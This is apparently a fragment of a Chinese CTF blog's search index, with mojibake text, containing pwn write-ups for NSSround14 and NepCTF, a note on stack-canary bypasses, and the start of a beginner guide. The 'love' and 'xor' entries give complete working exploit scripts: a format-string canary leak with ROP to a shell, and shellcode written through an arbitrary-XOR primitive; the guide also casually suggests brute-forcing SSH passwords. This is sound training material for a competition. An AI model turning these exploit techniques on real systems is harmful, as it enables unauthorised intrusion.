30%;"><p>åˆæ˜¯ä¸€ä¸ªå¥‡æ€ªçš„è¯­è¨€ï¼Œæƒ³åˆ°æœ¬é¢˜èƒŒæ™¯æ˜¯æ˜Ÿç©¹é“é“ï¼Œæ‰€ä»¥å»æ‰¾äº†ä¸€ä¸‹æ˜Ÿé“çš„æ–‡å­—ï¼Œå‘ç°å›¾ç‰‡é‡Œçš„åº”è¯¥æ˜¯å®‡å®™é€šç”¨æ–‡</p><p>å»wikiæ‰¾åˆ°äº†ç è¡¨:<br><img src="/NepCTF2023-WP/image-20230813202732539.png" alt="å®‡å®™é€šç”¨æ–‡" style="zoom: 67%;"></p><p>å¯¹ç…§å¾—åˆ°flagï¼š</p><p>NepCTF{HRP_aIways_likes_March_7th}</p><h1 id="pwn-HRP-CHAT-3"><a href="#pwn-HRP-CHAT-3" class="headerlink" title="pwn-HRP-CHAT-3"></a>pwn-HRP-CHAT-3</h1><p>è·å–é€”å¾„æ˜¯è¿›å…¥Startï¼Œç„¶åæ‰“è´¥bossã€‚</p><p>ç”±äºåªèƒ½æ”»å‡»ä¸€æ¬¡ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸ªæ”»å‡»æœ€é«˜çš„ï¼ˆH3h3QAQï¼‰ï¼Œä¿è¯èƒ½ç§’æ‰bossã€‚</p><p>Shopé‡Œæ²¡æœ‰ï¼Œåªèƒ½æŠ½å¡ï¼ˆRollCardï¼‰</p><p>å‡ºæ¥åç›´æ¥å»æ‰“Startå°±è¡Œï¼Œè¾“å…¥çš„ä¸‹æ ‡åœ¨æºç é‡Œæ‰¾åˆ†åˆ«å¯¹åº”Characterså’Œskillè¿™ä¸¤ä¸ªæ•°ç»„çš„ä¸‹æ ‡ï¼Œæ‰€ä»¥æ³¨æ„è‡ªå·±çš„H3h3QAQæ˜¯å“ªä¸ªä¸‹æ ‡å°±è¡Œäº†</p><p><img src="/NepCTF2023-WP/image-20230813203835458.png" alt="image-20230813203835458"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> NepCTF </tag>
            
            <tag> Misc </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryå¸¸è§ç»•è¿‡æ€è·¯</title>
      <link href="/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
      <url>/Canary%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><em><strong>æ€»è§ˆï¼š</strong></em></p><ul><li>åŸºæœ¬leak</li><li>forkå­è¿›ç¨‹çˆ†ç ´</li><li>æ‰“TLS</li></ul><span id="more"></span><h1 id="1ã€åŸºæœ¬leak"><a href="#1ã€åŸºæœ¬leak" class="headerlink" title="1ã€åŸºæœ¬leak"></a>1ã€åŸºæœ¬leak</h1><p>ç”±äºcanaryæ˜¯ä»¥\x00ç»“å°¾ï¼ˆæ­£å¥½æˆªæ–­å­—ç¬¦ï¼‰ï¼Œæ‰€ä»¥å¦‚æœæŠŠ\x00è¦†ç›–æ‰ï¼Œå°±å¯ä»¥å®ç°leak canaryã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSround14wp</title>
      <link href="/NSSround14wp/"/>
      <url>/NSSround14wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¬¡round14åªæ‰“äº†ä¸€é¢˜ï¼Œï¼ˆæ²¡æŠ¥é›¶çœŸæ˜¯å¤ªå¥½äº†ï¼‰ï¼Œèµ›ååœ¨@æ‘¸é±¼ã®çŒ« å¸ˆå‚…çš„æŒ‡ç‚¹ä¸‹åˆè§£å†³äº†ä¸€é¢˜</p><img src="/NSSround14wp/nssround14.png" alt="round14" style="zoom:50%;"><p><strong>ä¹Ÿè®¸æ˜¯ç›®å½•</strong></p><ul><li>love</li><li>xor</li></ul><span id="more"></span><h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p><em><strong>PS: åšé¢˜éƒ½èƒ½çœ‹åˆ°Tokaï¼Œæˆ‘ç›´æ¥ç‹‚å–œ-ing</strong></em></p><p>ğŸ‘‰ <a href="../resources/pwn_asset/NSS_round14/love.zip" target="_block">ç‚¹å‡»ä¸‹è½½é™„ä»¶</a></p><img src="/NSSround14wp/loveMain.png" alt="loveMain" style="zoom:75%;"><p>å‘ç°mainåˆæ ¼å¼åŒ–æ¼æ´ï¼Œç¨‹åºå¼€äº†canaryä¿æŠ¤</p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼š<strong>åˆ©ç”¨printfæ”¹å†™v4ä½¿å…¶ç­‰äºv5ï¼Œå¹¶ä¸”æ³„éœ²canary</strong></p><img src="/NSSround14wp/lovevuln.png" alt="lovevuln" style="zoom:75%;"><p>ç„¶åè¿›å…¥vulnå‡½æ•°å°±æ˜¯ä¸€ä¸ªç®€å•çš„æº¢å‡º</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28037</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4013f3</span></span><br><span class="line">r()</span><br><span class="line">payload = <span class="string">b&#x27;%520c%9$n.%15$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">res = r().split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(res[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40125d</span>)<span class="comment"># è¿™é‡Œè®°å¾—è¿”å›åˆ°vulnï¼Œåˆ«è¿”å›åˆ°mainå•¦ï¼Œè¦ä¸ç„¶åˆè¦å†åˆ©ç”¨ä¸€éprintfäº†</span></span><br><span class="line">sl(payload)</span><br><span class="line">libc_base = get_addr() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret)</span><br><span class="line">payload += p64(rdi) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">i()</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>ğŸ‘‰ <a href="../resources/pwn_asset/NSS_round14/xor.zip" target="_block">ç‚¹å‡»ä¸‹è½½é™„ä»¶</a></p><img src="/NSSround14wp/xorMain.png" alt="xorMain" style="zoom:80%;"><p>flagåœ¨bssæ®µï¼Œåˆ¤æ–­å°äºç­‰äº0è·³å‡ºå¾ªç¯ï¼ŒxorByteWithAddresså¯ä»¥ä¸ä»»æ„åœ°å€æ•°æ®å¼‚æˆ–ï¼Œæ‰€ä»¥ç»™é«˜ä½å¼‚æˆ–ä¸€ä¸ª0xFFï¼ˆå˜æˆè´Ÿæ•°ï¼‰ï¼ŒåŸºæœ¬ä¸Šç›¸å½“äºæ— é™å¾ªç¯ï¼ˆloopï¼‰äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾ä¸€æ®µrwï¼ˆreadableï¼Œwriteableï¼‰åŒºåŸŸå†™å…¥shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0, éšä¾¿æ‰¾åˆ°çš„ï¼Œåªæ˜¯æŠŠä¸ªä½å‡‘ä¸ª0è€Œå·²</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>ç„¶åæƒ³åŠæ³•è§¦å‘shellcodeï¼Œå› ä¸ºç¨‹åºæ²¡æœ‰æ ˆæº¢å‡ºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è®©ç¨‹åºè‡ªå·±è§¦å‘ã€‚</p><p>ç”±äºåœ¨mainç»“æŸåä¼šè·³è½¬åˆ°_final_arrayå‚¨å­˜çš„åœ°å€ï¼Œè¿™é‡ŒæŠŠå‚¨å­˜çš„åœ°å€æ”¹æˆæˆ‘ä»¬å†™å…¥çš„shellcodeåœ°å€ï¼Œç„¶åå†æŠŠflagé«˜ä½å¼‚æˆ–ä¸€ä¸ª0xffï¼ˆå˜æˆ0ï¼Œä¹Ÿå°±æ˜¯è¯´flagå˜æˆæ­£æ•°ï¼Œè·³å‡ºå¾ªç¯ï¼Œä½¿mainç»“æŸï¼‰</p><img src="/NSSround14wp/finalArray.png" alt="finalArray" style="zoom:80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 to 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å®Œæ•´expï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 &gt; 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> NSS Round </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnæ–°æ‰‹æ‘</title>
      <link href="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/"/>
      <url>/pwn%E6%96%B0%E6%89%8B%E6%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><em><strong>é•¿æœŸæ›´æ–°ä¸­â€¦â€¦</strong></em></p><p>æ—¢ç„¶é€‰æ‹©è¿™æ¡æ³¨å®šè‰°éš¾çš„è·¯ï¼Œé‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å§‹å§ï¼<del>ï¼ˆæ‹œæ‰˜~ï¼Œpwnæ‰ç³»ç»Ÿä»€ä¹ˆçš„çœŸçš„è¶…å¸…çš„ï¼ï¼‰</del></p><span id="more"></span><h1 id="ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼"><a href="#ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼" class="headerlink" title="ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼"></a>ä¹Ÿè®¸éœ€è¦ncä¸€ä¸‹ï¼Ÿï¼</h1><p>è¦pwnè‚¯å®šè¦å…ˆè¿æ¥æœåŠ¡å™¨å˜›ã€‚ä¸€èˆ¬ç»™äº†åœ°å€å’Œç«¯å£å¯ä»¥ç›´æ¥ç”¨pwntoolsçš„remoteè¿æ¥</p><p>æ¯”å¦‚ç»™ä½ äº† <code>114.514.19.19:810</code></p><p>pwntoolsè¿œç¨‹å°±æ˜¯<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>ï¼Œ</p><p>æœ¬åœ°æ‰“å°±ç”¨ <code>io = process(&#39;file_path&#39;)</code></p><p>å¦‚æœè¦åœ¨kaliä¸Šå°±æ˜¯ <code>$ nc 114.514.19.19 810</code></p><p>å½“ç„¶æœ‰æ—¶å€™å¯èƒ½æ˜¯sshï¼Œtelnetä¹‹ç±»çš„</p><p>å¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢å¦‚ä½•è¿æ¥ã€‚</p><p>è¿™é‡Œä»¥sshä¸ºä¾‹ï¼š å‡è®¾ç”¨æˆ·æ˜¯ctf é‚£ä¹ˆå°±å¯ä»¥ç”¨<code>$ ssh ctf@114.514.19.19 -p 810</code>è¿æ¥ï¼Œç„¶åå†è¾“å…¥å¯†ç ï¼ˆæ²¡æœ‰ç»™å°±è‡ªå·±çˆ†å§ï¼Œç”šè‡³å¯èƒ½ä¸ç»™ç«¯å£2333ï¼‰</p><p>ä¸è¿‡æœ‰ç§å·æ‡’çš„æ–¹æ³•å°±æ˜¯ç›´æ¥ç”¨xshellè¿æ¥ï¼ˆdownload: <a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p><p>å…·ä½“ç”¨æ³•è¯·è‡ªè¡Œç™¾åº¦</p><h1 